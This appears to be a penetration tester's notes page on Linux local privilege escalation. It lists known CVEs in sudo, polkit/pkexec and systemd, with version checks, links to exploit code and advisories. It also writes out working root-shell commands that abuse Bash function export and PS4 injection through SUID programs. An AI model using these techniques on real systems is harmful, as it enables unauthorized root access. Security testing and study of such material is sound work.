---
title: Linux Userspace Privilege Escalation Exploits
---

[[notes/linux/escalation]] trough userspace exploits.

List installed packages and their versions.

~~~ bash
dpkg -l || rpm -qa
~~~

# Sudoedit Heap Overflow CVE-2021-3156

Affects all `sudo` legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1.
Exploitation does not require membership in the `sudo` / `wheel` group.

Check.

~~~ bash
sudoedit -s '\' `perl -e 'print "A" x 65536'`
sudo -s '\\' `perl -e 'print "A" x 65536'`
~~~

# Polkit CVE-2021-3560

Affects polkit >= 0.113 and >= 0.105-26 on Debian.

The exploit [CVE-2021-3560.py](http://web.archive.org/web/20230729182550/https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py) was successfully tested against polkit 0.115-6 on Cent OS 8.

Check version.

~~~ bash
grep -aF polkitd- /usr/lib/polkit-1/polkitd
~~~

References:

- [Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug](http://web.archive.org/web/20230707035106/https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/)

# PwnKit CVE-2021-4034

Untested exploits:

- [blasty-vs-pkexec.c](http://web.archive.org/web/20221006105914/https://haxx.in/files/blasty-vs-pkexec.c)
- [blasty-vs-pkexec2.c](http://web.archive.org/web/20221006105959/https://haxx.in/files/blasty-vs-pkexec2.c)

References:

- [PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034)](http://web.archive.org/web/20221006110059/https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)

# sudo systemctl status

Affects Systemd before v247.

References:

- [CVE-2023–26604](http://web.archive.org/web/20230406145953/https://scribe.rip/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7)

# Bash Function with Slashes

With Bash < 4.2-048 and a SUID binary that calls another program by absolute path, create a bash function named like the path.

~~~
$ strings /usr/local/bin/suid-binary
...
/usr/sbin/service apache2 start
...
$ function /usr/sbin/service { /bin/bash -p; }
$ export -f /usr/sbin/service
$ /usr/local/bin/suid-binary
~~~

# Bash PS4

With Bash < 4.4 and a SUID program evaluating/running bash scripts the `PS4` environment variable is inherited.

~~~ bash
env -i SHELLOPTS=xtrace PS4='$(bash -p)' /usr/local/bin/pwn-me
~~~
